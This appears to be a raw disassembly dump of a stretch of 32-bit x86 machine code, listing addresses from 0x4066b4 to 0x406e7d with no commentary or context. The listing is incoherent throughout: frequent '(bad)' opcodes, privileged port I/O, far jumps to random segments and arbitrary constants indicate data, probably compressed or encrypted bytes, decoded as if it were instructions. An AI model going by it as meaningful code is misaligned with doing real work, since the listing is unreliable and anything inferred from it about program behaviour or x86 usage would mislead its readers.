  4066b4:	out    dx,al
  4066b5:	pop    es
  4066b6:	iret   
  4066b7:	xchg   BYTE PTR ds:[ebx-0x3b],al
  4066bb:	and    cl,BYTE PTR [ebp+0x28c80a7]
  4066c1:	mov    ch,al
  4066c3:	push   0x63
  4066c5:	mov    BYTE PTR [esi-0x266759e4],bh
  4066cb:	iret   
  4066cc:	xlat   BYTE PTR ds:[ebx]
  4066cd:	das    
  4066ce:	popf   
  4066cf:	push   ds
  4066d0:	imul   eax,DWORD PTR [edx],0xfffffff7
  4066d3:	pop    ebx
  4066d4:	xchg   esi,eax
  4066d5:	cmp    BYTE PTR es:[ebp-0x44],ah
  4066d9:	pop    ebp
  4066da:	add    DWORD PTR [edx],edx
  4066dc:	sbb    DWORD PTR [ebx],0x88243fe2
  4066e2:	xlat   BYTE PTR ds:[ebx]
  4066e3:	cmc    
  4066e4:	dec    eax
  4066e5:	pop    ss
  4066e6:	mov    eax,0x610f4c9c
  4066eb:	push   ebx
  4066ec:	xchg   ebx,eax
  4066ed:	push   0xffffffe6
  4066ef:	inc    edi
  4066f0:	out    0xda,al
  4066f2:	pop    ebx
  4066f3:	je     0x4066be
  4066f5:	aaa    
  4066f6:	mov    esi,0xf618d5f5
  4066fb:	push   es
  4066fc:	popf   
  4066fd:	jg     0x4066d9
  4066ff:	jo     0x40677a
  406701:	pop    es
  406702:	jmp    0x406782
  406704:	je     0x406700
  406706:	sub    BYTE PTR [ecx-0x80],bl
  406709:	in     al,0x83
  40670b:	pop    esi
  40670c:	(bad)  
  40670d:	mov    esp,?
  40670f:	data16 mov BYTE PTR [ebp+0x6a],bl
  406713:	jmp    0xba390fc3
  406718:	mov    eax,es:0x5f5045b8
  40671e:	adc    bl,cl
  406720:	hlt    
  406721:	xor    DWORD PTR [ebx],ebp
  406723:	inc    eax
  406724:	stos   DWORD PTR es:[edi],eax
  406725:	(bad)  
  406726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406727:	lahf   
  406728:	lock sar DWORD PTR [edi],1
  40672b:	fs (bad) 
  40672d:	xor    BYTE PTR [esi],al
  40672f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406730:	int3   
  406731:	dec    edx
  406732:	add    BYTE PTR ds:0x4010781b,bh
  406738:	mov    al,ds:0x29c332a4
  40673d:	aaa    
  40673e:	dec    eax
  40673f:	sub    al,0xf3
  406741:	iret   
  406742:	lods   eax,DWORD PTR ds:[esi]
  406743:	xlat   BYTE PTR ds:[ebx]
  406744:	loope  0x406713
  406746:	bnd jl 0x406712
  406749:	jno    0x4066da
  40674b:	cmp    BYTE PTR [ecx+edi*2],ch
  40674e:	call   0x5827:0x9a5e8e5a
  406755:	xchg   ebp,eax
  406756:	add    eax,0xc13df463
  40675b:	mov    esi,0x66a4f8f5
  406760:	sub    dl,cl
  406762:	cmp    al,0x80
  406764:	and    BYTE PTR ds:0x71f48c71,al
  40676a:	or     eax,0xed37b1f6
  40676f:	pop    ebp
  406770:	push   edi
  406771:	xchg   BYTE PTR [edx-0x23f39e77],dh
  406777:	and    BYTE PTR [ebx-0x1d653ce],dl
  40677d:	cs gs cwde 
  406780:	sbb    al,0x7c
  406782:	xor    al,0x7f
  406784:	iret   
  406785:	xchg   edi,eax
  406786:	into   
  406787:	call   0xba649ddd
  40678c:	xchg   esi,eax
  40678d:	repz adc eax,0xe23c29bf
  406793:	mov    eax,0x73e88e4c
  406798:	cs mov dl,0xde
  40679b:	ret    0xdc70
  40679e:	(bad)  
  40679f:	mov    eax,ds:0xc1f37400
  4067a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067a5:	popf   
  4067a6:	pushf  
  4067a7:	and    DWORD PTR [edi-0x7f],edx
  4067aa:	sub    BYTE PTR [eax-0x445479e4],dl
  4067b0:	jbe    0x406742
  4067b2:	push   ecx
  4067b3:	mov    edi,0x6bdd9b
  4067b8:	repz adc dl,BYTE PTR ds:0x4dd70a1c
  4067bf:	fstp   DWORD PTR [eax+0x3ab827d4]
  4067c5:	sbb    eax,0xeca6ca7d
  4067ca:	add    esp,ebp
  4067cc:	jns    0x40680f
  4067ce:	stc    
  4067cf:	jb     0x406751
  4067d1:	push   edx
  4067d2:	mov    gs,WORD PTR [edi-0x2c]
  4067d5:	add    eax,0x7bf7dcf
  4067da:	dec    eax
  4067db:	mov    dl,0x25
  4067dd:	dec    esp
  4067de:	push   ebx
  4067df:	cmp    al,0xb5
  4067e1:	data16 je 0x406854
  4067e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067e5:	bnd jae 0x40679f
  4067e8:	sar    bh,1
  4067ea:	(bad)  
  4067eb:	or     edx,esi
  4067ed:	add    DWORD PTR [ecx-0x1ae3b604],0xffffffbf
  4067f4:	xchg   esi,eax
  4067f5:	jg     0x4067d9
  4067f7:	inc    ebp
  4067f8:	int    0x45
  4067fa:	mov    ch,0x2c
  4067fc:	adc    DWORD PTR [ecx+0x11],0x8
  406800:	ss fscale 
  406803:	out    dx,eax
  406804:	popa   
  406805:	ins    DWORD PTR es:[edi],dx
  406806:	push   esp
  406807:	retw   
  406809:	popa   
  40680a:	cmp    DWORD PTR [ecx-0x55],esi
  40680d:	jg     0x4067b9
  40680f:	iret   
  406810:	das    
  406811:	int    0xfa
  406813:	sub    edx,DWORD PTR [edi-0x7132599c]
  406819:	jns    0x406872
  40681b:	adc    eax,0x3ba99fae
  406820:	clc    
  406821:	je     0x4067eb
  406823:	sbb    ebp,DWORD PTR [ecx+eax*4-0x36e84de4]
  40682a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40682b:	repz ds mov bh,0x78
  40682f:	inc    ecx
  406830:	inc    ebx
  406831:	lock mov DWORD PTR [edi],ebx
  406834:	cmp    edi,DWORD PTR [edi-0x4974afca]
  40683a:	mov    ds:0xf39b1030,eax
  40683f:	xor    DWORD PTR [edx-0x52a333f9],esp
  406845:	and    DWORD PTR [esp+ecx*1],ebx
  406848:	out    dx,al
  406849:	jno    0x4067db
  40684b:	lds    edi,FWORD PTR [eax-0x23]
  40684e:	out    dx,al
  40684f:	jb     0x4068b4
  406851:	mov    edx,ebx
  406853:	das    
  406854:	dec    edi
  406855:	stos   BYTE PTR es:[edi],al
  406856:	mov    ecx,0x1f4188
  40685b:	or     eax,0x213087aa
  406860:	sub    esp,DWORD PTR [eax-0x688b6402]
  406866:	push   0x64
  406868:	fwait
  406869:	cmc    
  40686a:	test   al,0xf3
  40686c:	popf   
  40686d:	xlat   BYTE PTR ds:[ebx]
  40686e:	mov    bh,0xbf
  406870:	fadd   DWORD PTR [ebx]
  406872:	and    edi,DWORD PTR [esi]
  406874:	or     esp,DWORD PTR [edx-0x25]
  406877:	fs addr16 in eax,0x9a
  40687b:	mov    ah,0xdd
  40687d:	retf   
  40687e:	ins    DWORD PTR es:[edi],dx
  40687f:	enter  0x18c8,0xd4
  406883:	stos   DWORD PTR es:[edi],eax
  406884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406885:	jbe    0x406871
  406887:	push   ebp
  406888:	inc    ebx
  406889:	fistp  DWORD PTR [esi+eax*1+0x23edee81]
  406890:	sbb    ah,BYTE PTR [eax+eiz*4]
  406893:	inc    edx
  406894:	mov    cl,BYTE PTR [ecx]
  406896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406897:	jnp    0x406876
  406899:	sub    ah,bl
  40689b:	and    DWORD PTR [ecx],edx
  40689d:	xchg   ecx,eax
  40689e:	pop    eax
  40689f:	mov    ebp,0xc9993556
  4068a4:	jge    0x406838
  4068a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068a7:	jae    0x4068cd
  4068a9:	pop    edx
  4068aa:	or     bl,BYTE PTR [esi+0x37]
  4068ad:	repz es jmp 0x666028c3
  4068b4:	adc    dh,BYTE PTR [ebx]
  4068b6:	cmp    BYTE PTR [esi],0xf
  4068b9:	sbb    DWORD PTR [ecx+0xc],0xfa2ed47e
  4068c0:	pop    ecx
  4068c1:	or     eax,0xc094e34a
  4068c6:	mov    cl,0x18
  4068c8:	sub    BYTE PTR [ebp+eiz*2-0x53990da9],dl
  4068cf:	lahf   
  4068d0:	iret   
  4068d1:	data16 adc bh,BYTE PTR cs:[eax+0x7b]
  4068d6:	out    dx,al
  4068d7:	push   ebx
  4068d8:	push   ebp
  4068d9:	cli    
  4068da:	xor    al,0xd6
  4068dc:	jb     0x406906
  4068de:	inc    edx
  4068df:	cmp    DWORD PTR [edx+ebx*1],edx
  4068e2:	iret   
  4068e3:	pop    ecx
  4068e4:	jecxz  0x40692a
  4068e6:	fs (bad) 
  4068e8:	mov    bh,0xb2
  4068ea:	mov    BYTE PTR [ecx-0x783ef46b],dh
  4068f0:	outs   dx,BYTE PTR ds:[esi]
  4068f1:	or     BYTE PTR [ebx-0x1264bf2e],bl
  4068f7:	and    DWORD PTR [eax+ebp*2],ebp
  4068fa:	cmp    ebp,0x3be21265
  406900:	cmp    eax,0xe72423ba
  406905:	cdq    
  406906:	sbb    DWORD PTR [edi+0x56],0x34979274
  40690d:	ins    BYTE PTR es:[edi],dx
  40690e:	sbb    ah,BYTE PTR [edx+0x7f05c253]
  406914:	mov    dl,0x49
  406916:	push   es
  406917:	or     al,0x6c
  406919:	jmp    0xb01ce32c
  40691e:	sbb    DWORD PTR [edx+0x3f99fd52],esp
  406924:	dec    ebp
  406925:	xor    al,0xdc
  406927:	adc    cl,ah
  406929:	sbb    ebx,DWORD PTR [ebx+ebx*4+0x76]
  40692d:	int3   
  40692e:	add    cl,dh
  406930:	icebp  
  406931:	icebp  
  406932:	bound  edx,QWORD PTR [esi]
  406934:	jmp    0x4068f0
  406936:	rep outs dx,DWORD PTR ds:[esi]
  406938:	jp     0x4068f7
  40693a:	jns    0x406982
  40693c:	mov    bl,0x4
  40693e:	cdq    
  40693f:	xchg   ebp,eax
  406940:	fcos   
  406942:	xor    DWORD PTR [ecx-0x5d],esi
  406945:	lods   ax,WORD PTR ds:[esi]
  406947:	(bad)  
  406948:	addr16 add al,0x55
  40694b:	add    eax,0x9ea6ece7
  406950:	mov    edx,fs
  406952:	mov    al,ds:0xa4ec8ce1
  406957:	sub    BYTE PTR ds:[esp+ecx*2-0x7e48fca1],cl
  40695f:	dec    DWORD PTR [ebp+0x24]
  406962:	shl    BYTE PTR [ebp+0x217221ef],cl
  406968:	jle    0x406947
  40696a:	push   esi
  40696b:	repz jle 0x4069cc
  40696e:	mov    ebx,0x4dc8afe7
  406973:	push   ss
  406974:	dec    edx
  406975:	aaa    
  406976:	dec    edx
  406977:	sbb    al,0xa8
  406979:	add    al,0xaf
  40697b:	mov    bl,0x86
  40697d:	retf   
  40697e:	dec    edi
  40697f:	jp     0x40690b
  406981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406982:	popa   
  406983:	div    eax
  406985:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406987:	int    0x41
  406989:	fistp  QWORD PTR [edi]
  40698b:	mov    esi,DWORD PTR [ebp+0x504cee9e]
  406991:	test   dh,0x98
  406994:	cdq    
  406995:	adc    edx,ebx
  406997:	xlat   BYTE PTR ds:[ebx]
  406998:	fcomp  DWORD PTR [ecx]
  40699a:	(bad)  
  40699b:	das    
  40699c:	jmp    0xcf425ae3
  4069a1:	ins    BYTE PTR es:[edi],dx
  4069a2:	xor    al,0x3e
  4069a4:	inc    esp
  4069a5:	cdq    
  4069a6:	popa   
  4069a7:	mov    ds:0xb14fd0b1,al
  4069ac:	dec    ecx
  4069ad:	jne    0x40694d
  4069af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069b0:	loopne 0x4069a7
  4069b2:	inc    eax
  4069b3:	sbb    eax,0xcd4ce34d
  4069b8:	mov    edi,0x9dc2c75c
  4069bd:	inc    edi
  4069be:	(bad)  
  4069bf:	in     eax,dx
  4069c0:	xor    al,0xf9
  4069c2:	jnp    0x4069d9
  4069c4:	stc    
  4069c5:	inc    ebp
  4069c6:	sub    ch,BYTE PTR [ebx+eax*4-0x28278621]
  4069cd:	ja     0x4069f2
  4069cf:	mov    dh,0x99
  4069d1:	cld    
  4069d2:	jnp    0x40699a
  4069d4:	sub    BYTE PTR [esi+eiz*8-0x623891e9],al
  4069db:	xchg   ebx,eax
  4069dc:	push   ecx
  4069dd:	or     al,0xad
  4069df:	adc    dl,bl
  4069e1:	add    ch,BYTE PTR [ecx+0x64]
  4069e4:	cmp    eax,0x8043a54a
  4069e9:	sub    ah,BYTE PTR [edi]
  4069eb:	shl    BYTE PTR [esp+edi*4-0x7cae22bb],0xe9
  4069f3:	clc    
  4069f4:	sbb    eax,0x3349c584
  4069f9:	jle    0x406a5d
  4069fb:	xor    ebp,ebp
  4069fd:	fld    QWORD PTR [edi]
  4069ff:	jb     0x4069bf
  406a01:	imul   BYTE PTR [ecx+0x758d2f09]
  406a07:	xchg   edx,eax
  406a08:	jge    0x406a29
  406a0a:	int3   
  406a0b:	daa    
  406a0c:	pop    ebp
  406a0d:	(bad)  
  406a0e:	push   edi
  406a0f:	push   es
  406a10:	sub    cl,BYTE PTR [esi]
  406a12:	push   0xd4641bde
  406a17:	fmul   DWORD PTR [edi]
  406a19:	xchg   esp,eax
  406a1a:	out    dx,al
  406a1b:	(bad)  [edx-0x7b593bc0]
  406a21:	loopne 0x406aa1
  406a23:	sbb    dh,BYTE PTR [ebx]
  406a25:	loopne 0x406a16
  406a27:	out    dx,eax
  406a28:	in     al,dx
  406a29:	xchg   BYTE PTR [ecx+0x30],al
  406a2c:	mov    bl,0x11
  406a2e:	ficom  DWORD PTR [edi]
  406a30:	lods   al,BYTE PTR ds:[esi]
  406a31:	(bad)
  406a35:	cmp    eax,0x3ee6ede6
  406a3a:	pop    es
  406a3b:	fstp   TBYTE PTR [edx+0x5c7dbae5]
  406a41:	outs   dx,DWORD PTR ds:[esi]
  406a42:	adc    dh,dl
  406a44:	in     eax,0x31
  406a46:	cmp    BYTE PTR [ebx+0x1bcea853],bh
  406a4c:	int    0x7b
  406a4e:	test   al,0x3
  406a50:	xor    eax,0xdf4d6805
  406a55:	mov    dl,0xb2
  406a57:	leave  
  406a58:	scas   eax,DWORD PTR es:[edi]
  406a59:	cmp    eax,0x5ef70b72
  406a5e:	xor    ch,dl
  406a60:	dec    esp
  406a61:	int3   
  406a62:	lock mov ss,WORD PTR [edx]
  406a65:	nop
  406a66:	pusha  
  406a67:	push   ebx
  406a68:	add    esp,edx
  406a6a:	ror    BYTE PTR [ebx],0x9
  406a6d:	lea    eax,[edx+0x16445dd4]
  406a73:	sub    DWORD PTR ds:[ebx+0x6bf471bd],edi
  406a7a:	dec    ecx
  406a7b:	int    0xaa
  406a7d:	icebp  
  406a7e:	push   edx
  406a7f:	test   al,0x97
  406a81:	dec    esi
  406a82:	into   
  406a83:	loopne 0x406a0c
  406a85:	test   DWORD PTR [ebx],edx
  406a87:	jp     0x406a8f
  406a89:	test   DWORD PTR [edx-0x62],0xa8bc36ae
  406a90:	cs jecxz 0x406a8a
  406a93:	test   al,0x1b
  406a95:	jg     0x406a44
  406a97:	fcom   QWORD PTR [ecx]
  406a99:	arpl   WORD PTR cs:[ecx+0x62],cx
  406a9d:	loopne 0x406a59
  406a9f:	push   ss
  406aa0:	addr16 adc esi,ebp
  406aa3:	sbb    BYTE PTR [esp+eax*4],0xb
  406aa7:	push   cs
  406aa8:	jecxz  0x406a2d
  406aaa:	mov    dh,0x1e
  406aac:	ss mov edx,0x7cc9e198
  406ab2:	jle    0x406a62
  406ab4:	in     eax,dx
  406ab5:	ret    0x8b93
  406ab8:	neg    DWORD PTR [ecx+ecx*2+0x35e2b061]
  406abf:	in     eax,0x6
  406ac1:	mov    ds:0x47ca6ca2,al
  406ac6:	push   edx
  406ac7:	push   esi
  406ac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ac9:	fldenv [esp+eax*1+0xa]
  406acd:	xor    al,0x6e
  406acf:	sbb    eax,0x4cab3cdb
  406ad4:	pop    ecx
  406ad5:	popa   
  406ad6:	jno    0x406b2c
  406ad8:	scas   eax,DWORD PTR es:[edi]
  406ad9:	xchg   esp,eax
  406ada:	nop
  406adb:	fist   WORD PTR [edi-0x1fa4de66]
  406ae1:	sub    esp,eax
  406ae3:	pop    esi
  406ae4:	sub    ebx,edi
  406ae6:	cdq    
  406ae7:	mov    edx,DWORD PTR [ebp+0xed9ce80]
  406aed:	dec    edx
  406aee:	ins    DWORD PTR es:[edi],dx
  406aef:	xchg   edx,eax
  406af0:	inc    edi
  406af1:	cs aas 
  406af3:	ja     0x406ad0
  406af5:	ror    ah,1
  406af7:	mov    edi,0x85dc82b3
  406afc:	data16 into 
  406afe:	(bad)  
  406aff:	fadd   DWORD PTR [esi]
  406b01:	add    esp,DWORD PTR [ecx+0x1d6810ac]
  406b07:	jle    0x406aa4
  406b09:	add    DWORD PTR [esi-0x13],edx
  406b0c:	xchg   DWORD PTR [edi],ebx
  406b0e:	shl    BYTE PTR [ebp+0x4d],0x1a
  406b12:	mov    edx,DWORD PTR [edx-0x3]
  406b15:	(bad)  
  406b17:	adc    dl,dh
  406b19:	fcomp  DWORD PTR [ebx+ebp*4+0x60622bdc]
  406b20:	call   0x2582:0xeb4a7d34
  406b27:	adc    dl,ch
  406b29:	ins    DWORD PTR es:[edi],dx
  406b2a:	add    esi,edi
  406b2c:	dec    esi
  406b2d:	in     al,dx
  406b2e:	dec    ebp
  406b2f:	inc    ecx
  406b30:	inc    esp
  406b31:	mov    dh,0x36
  406b33:	pop    edx
  406b34:	inc    ebx
  406b35:	cmp    eax,0x60dcf509
  406b3a:	mov    eax,ds:0x4c8b68f0
  406b3f:	test   al,0x30
  406b41:	aad    0x54
  406b43:	ret    0xac2a
  406b46:	or     al,0x51
  406b48:	sub    DWORD PTR [ebx+0x3d],esi
  406b4b:	in     eax,dx
  406b4c:	inc    edx
  406b4d:	and    eax,0xc0a1abd0
  406b52:	cli    
  406b53:	inc    ebp
  406b54:	xchg   esi,eax
  406b55:	aam    0x82
  406b57:	cli    
  406b58:	fadd   DWORD PTR [eax-0x55]
  406b5b:	inc    ecx
  406b5c:	retf   0x85f0
  406b5f:	int3   
  406b60:	popa   
  406b61:	pop    ss
  406b62:	stos   DWORD PTR es:[edi],eax
  406b63:	mov    bh,0x32
  406b65:	sbb    edx,DWORD PTR [edx]
  406b67:	sub    DWORD PTR [edx],edi
  406b69:	push   0xcc2b2382
  406b6e:	xchg   ah,dh
  406b70:	outs   dx,DWORD PTR ds:[esi]
  406b71:	cs sbb bl,al
  406b74:	dec    edi
  406b75:	ss data16 cmp al,0xb0
  406b79:	mov    ebx,0x9c5ca1ed
  406b7e:	push   0x3633cdfa
  406b83:	push   ebp
  406b84:	out    0x1a,eax
  406b86:	jns    0x406b34
  406b88:	inc    edx
  406b89:	pusha  
  406b8a:	add    ebp,eax
  406b8c:	into   
  406b8d:	fs enter 0x42f3,0x3
  406b92:	xor    BYTE PTR [edx+0x79],bl
  406b95:	ud1    edi,DWORD PTR ds:0xc699b718
  406b9c:	repnz aas 
  406b9e:	iret   
  406b9f:	test   eax,0xa12e25b2
  406ba4:	dec    edi
  406ba5:	mov    esp,0x2c079541
  406baa:	bound  ebx,QWORD PTR [ebx]
  406bac:	ds cmp DWORD PTR fs:[esi+0x6ad1dd12],esi
  406bb4:	icebp  
  406bb5:	or     ch,BYTE PTR ds:[ecx]
  406bb8:	repz cmp bh,BYTE PTR [esi-0x2da27364]
  406bbf:	mov    WORD PTR cs:[ebx],?
  406bc2:	dec    ecx
  406bc3:	outs   dx,BYTE PTR ds:[esi]
  406bc4:	(bad)  
  406bc5:	cdq    
  406bc6:	int    0x7c
  406bc8:	mov    ds:0x5cbdb91,al
  406bcd:	mov    esi,0x1d0050a7
  406bd2:	fwait
  406bd3:	je     0x406c11
  406bd5:	mov    eax,ds:0x9cdd0f7f
  406bda:	data16 shl BYTE PTR [edi],1
  406bdd:	sar    BYTE PTR [ecx+0x4b0eb582],cl
  406be3:	and    eax,0x5a1c8b92
  406be8:	int    0x41
  406bea:	sbb    al,dl
  406bec:	les    ebx,FWORD PTR ss:[edx-0x79]
  406bf0:	dec    ebx
  406bf1:	xchg   esi,eax
  406bf2:	iret   
  406bf3:	mov    esi,0xd5ab90c5
  406bf8:	div    DWORD PTR [edx+0x1eaea41]
  406bfe:	jbe    0x406c17
  406c00:	(bad)
  406c05:	push   es
  406c06:	shl    BYTE PTR [eax-0x7e],1
  406c09:	adc    al,BYTE PTR [esp+eax*2+0x342ac66d]
  406c10:	mov    edi,esp
  406c12:	rol    BYTE PTR [edi+0x313cb71a],1
  406c18:	or     al,0x4
  406c1a:	xor    cl,BYTE PTR [eax+0xe1813ca]
  406c20:	jmp    0x2c6f:0xce03900b
  406c27:	and    DWORD PTR [esi+ebp*1+0x69],edi
  406c2b:	push   0x57678de1
  406c30:	jmp    FWORD PTR [esi-0x67017845]
  406c36:	mov    dh,ch
  406c38:	scas   al,BYTE PTR es:[edi]
  406c39:	mov    dh,0xbc
  406c3b:	scas   al,BYTE PTR es:[edi]
  406c3c:	xchg   ebx,eax
  406c3d:	out    dx,al
  406c3e:	fld    DWORD PTR [eax-0x76]
  406c41:	ror    BYTE PTR ds:0x3571e6f9,cl
  406c47:	pop    edi
  406c48:	xchg   ecx,eax
  406c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c4a:	push   esi
  406c4b:	test   al,ch
  406c4d:	xchg   esp,eax
  406c4e:	push   ds
  406c4f:	cmp    al,0x69
  406c51:	std    
  406c52:	jnp    0x406c48
  406c54:	sahf   
  406c55:	dec    ecx
  406c56:	inc    ebx
  406c57:	popa   
  406c58:	mov    DWORD PTR [edi],ebx
  406c5a:	cwde   
  406c5b:	nop
  406c5c:	ja     0x406c27
  406c5e:	push   edx
  406c5f:	mov    bl,0x73
  406c61:	inc    ecx
  406c62:	mov    edx,0xa985700b
  406c67:	and    al,0x21
  406c69:	loop   0x406c75
  406c6b:	mov    al,0x90
  406c6d:	jmp    0x8a9ad7e5
  406c72:	cmp    esp,esi
  406c74:	repz cmp BYTE PTR [edx+ebp*4+0x5b7ae347],bh
  406c7c:	stc    
  406c7d:	nop
  406c7e:	jb     0x406c5a
  406c80:	adc    DWORD PTR [esi-0xd],0xffffffaa
  406c84:	idiv   DWORD PTR [edx]
  406c86:	sub    ch,BYTE PTR [edi-0x34f48355]
  406c8c:	je     0x406d01
  406c8e:	mov    al,0x3d
  406c90:	js     0x406c93
  406c92:	sbb    al,0xa1
  406c94:	out    dx,al
  406c95:	and    ebx,esp
  406c97:	sbb    esp,esi
  406c99:	iret   
  406c9a:	adc    dh,BYTE PTR [edx+0x54]
  406c9d:	(bad)  
  406c9e:	and    ecx,edx
  406ca0:	icebp  
  406ca1:	pop    eax
  406ca2:	(bad)  
  406ca4:	jmp    0x10cb:0xb06c1db1
  406cab:	push   eax
  406cac:	dec    ebp
  406cad:	mov    dh,BYTE PTR [esi]
  406caf:	xor    ch,BYTE PTR [ebp-0x68]
  406cb2:	rcl    ecx,0xe3
  406cb5:	xor    cl,ah
  406cb7:	dec    ecx
  406cb8:	test   eax,0x834bca3d
  406cbd:	stc    
  406cbe:	fld    QWORD PTR [esi]
  406cc0:	xor    dl,cl
  406cc2:	jmp    0x406cf6
  406cc4:	push   esp
  406cc5:	ins    BYTE PTR es:[edi],dx
  406cc6:	jb     0x406d3f
  406cc8:	stos   BYTE PTR es:[edi],al
  406cc9:	retf   0xb04b
  406ccc:	icebp  
  406ccd:	and    esp,edx
  406ccf:	push   eax
  406cd0:	(bad)  
  406cd1:	xor    al,0xe4
  406cd3:	adc    eax,0xb5286978
  406cd8:	cld    
  406cd9:	push   es
  406cda:	fs imul dh
  406cdd:	cmp    eax,0x3dd96060
  406ce2:	imul   ebx,DWORD PTR [ecx+0x28],0x51
  406ce6:	add    ah,cl
  406ce8:	int3   
  406ce9:	ret    
  406cea:	data16 fadd DWORD PTR [ebx-0x7d]
  406cee:	mov    al,BYTE PTR [ebx+0x12e279d4]
  406cf4:	pushf  
  406cf5:	push   ds
  406cf6:	push   ebp
  406cf7:	jns    0x406c9a
  406cf9:	or     dl,BYTE PTR [ecx+0x30cf4d42]
  406cff:	lock mov DWORD PTR [ebx-0x58],0xf0e779aa
  406d07:	lea    ebp,[eax-0x4ec2b7b]
  406d0d:	mov    ds:0xd586e24c,eax
  406d12:	add    ecx,ebp
  406d14:	inc    esi
  406d15:	or     BYTE PTR [eax+0x2],bl
  406d18:	mov    ecx,0x3e29c5b0
  406d1d:	pusha  
  406d1e:	sbb    DWORD PTR [ebx-0x15],eax
  406d21:	mov    BYTE PTR [ecx-0x2c],ch
  406d24:	cmp    al,0xd3
  406d26:	pop    ds
  406d27:	leave  
  406d28:	les    ebp,FWORD PTR [ebp-0x620a0304]
  406d2e:	fistp  DWORD PTR [eax+0x5d82fc4c]
  406d34:	imul   eax,DWORD PTR [edi],0x2f4e66f1
  406d3a:	push   ss
  406d3b:	aad    0x1c
  406d3d:	mov    ?,WORD PTR [ebp+0x7650db09]
  406d43:	or     eax,0xdef43015
  406d48:	mov    ah,0x7
  406d4a:	jbe    0x406d0a
  406d4c:	(bad)  
  406d4d:	ds jne 0x406d2f
  406d50:	inc    ecx
  406d51:	pop    esi
  406d52:	repnz mov bl,0xa2
  406d55:	sbb    eax,0xe31938f7
  406d5a:	repz or eax,0x3959a082
  406d60:	out    0x37,eax
  406d62:	arpl   WORD PTR [esp+ebp*8-0x2b],bx
  406d66:	bsf    eax,DWORD PTR [eax]
  406d69:	icebp  
  406d6a:	and    BYTE PTR [ebp-0x37],dl
  406d6d:	mov    al,0xd
  406d6f:	cmp    al,0x86
  406d71:	sar    DWORD PTR [ebx+0x5],1
  406d74:	cld    
  406d75:	mov    eax,0xedd07206
  406d7a:	in     al,dx
  406d7b:	sbb    BYTE PTR [edi+edi*1],0x32
  406d7f:	ds icebp 
  406d81:	mov    edx,0x6c3b2e52
  406d86:	cmp    eax,DWORD PTR ds:0x30642289
  406d8c:	xchg   DWORD PTR [ebx-0x37345180],esi
  406d92:	adc    eax,0xddbed185
  406d97:	dec    edx
  406d98:	fscale 
  406d9a:	fs (bad) 
  406d9c:	pop    ebx
  406d9d:	lods   al,BYTE PTR ds:[esi]
  406d9e:	jo     0x406d3c
  406da0:	sub    eax,0x7ca9138e
  406da5:	pop    ss
  406da6:	jno    0x406dde
  406da8:	mov    al,0x26
  406daa:	std    
  406dab:	mov    cl,0x2f
  406dad:	mov    bh,0xa8
  406daf:	sbb    eax,0x76521ee8
  406db4:	or     DWORD PTR [eax-0x238055a5],esi
  406dba:	cmp    BYTE PTR [ecx],al
  406dbc:	mov    bh,0xc6
  406dbe:	jnp    0x406e0c
  406dc0:	inc    ebx
  406dc1:	in     eax,dx
  406dc2:	cmp    BYTE PTR [ebp+0x57],dl
  406dc5:	stc    
  406dc6:	out    dx,al
  406dc7:	mov    ebp,0x9a83582
  406dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dcd:	and    ah,BYTE PTR [esi+eax*8]
  406dd0:	faddp  st(6),st
  406dd2:	xchg   ebx,eax
  406dd3:	xchg   ebp,eax
  406dd4:	adc    al,0xba
  406dd6:	jmp    0x489dd49f
  406ddb:	in     eax,0x71
  406ddd:	inc    edx
  406dde:	sub    eax,0x97f52f38
  406de3:	xor    al,0xc
  406de5:	out    dx,eax
  406de6:	rol    bh,0x8
  406de9:	out    0x12,eax
  406deb:	mov    esp,0x8b299fd6
  406df0:	jns    0x406e6d
  406df2:	inc    esi
  406df3:	cmp    al,BYTE PTR ss:[ebx-0x7b64e3d8]
  406dfa:	push   edx
  406dfb:	loopne 0x406d85
  406dfd:	pop    esp
  406dfe:	cwde   
  406dff:	add    eax,0x3344c3c2
  406e04:	cmp    al,0x0
  406e06:	jg     0x406e1c
  406e08:	int3   
  406e09:	fiadd  WORD PTR [ebp+0x59]
  406e0c:	sub    dh,BYTE PTR [eax+ecx*1+0x4d]
  406e10:	and    bh,bh
  406e12:	mov    edx,0x926e3fbc
  406e17:	loopne 0x406e07
  406e19:	xor    dh,BYTE PTR [edi-0x2b]
  406e1c:	lock fidivr WORD PTR [ecx+0x76]
  406e20:	out    0x99,eax
  406e22:	pop    ss
  406e23:	jmp    0x839eb90b
  406e28:	add    BYTE PTR [ebp-0x4272879f],bl
  406e2e:	xor    ch,BYTE PTR [edi-0x60]
  406e31:	bswap  eax
  406e33:	xlat   BYTE PTR ds:[ebx]
  406e34:	(bad)  
  406e35:	mov    bl,0x27
  406e37:	xor    dl,BYTE PTR [esi+0x1d]
  406e3a:	sbb    DWORD PTR [eax-0x2974aecf],0x1d6d441e
  406e44:	sbb    BYTE PTR [ecx],al
  406e46:	out    dx,eax
  406e47:	cmp    al,0xee
  406e49:	add    DWORD PTR [ebx],ecx
  406e4b:	jl     0x406e8a
  406e4d:	push   DWORD PTR [ebp-0x5e2f33e7]
  406e53:	shr    eax,1
  406e55:	in     al,dx
  406e56:	xor    bh,al
  406e58:	push   0x12a0f8cb
  406e5d:	pop    ecx
  406e5e:	loop   0x406ed3
  406e60:	enter  0x514a,0x3a
  406e64:	jns    0x406e66
  406e66:	push   edx
  406e67:	into   
  406e68:	ss add esi,ebp
  406e6b:	and    edi,DWORD PTR [ecx-0x4d477]
  406e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e72:	jnp    0x406e39
  406e74:	cmp    ebp,DWORD PTR [edx]
  406e76:	nop
  406e77:	test   DWORD PTR [edx+0x37],esp
  406e7a:	sbb    BYTE PTR [ecx+eiz*4],bh
  406e7d:	xchg   esi,eax
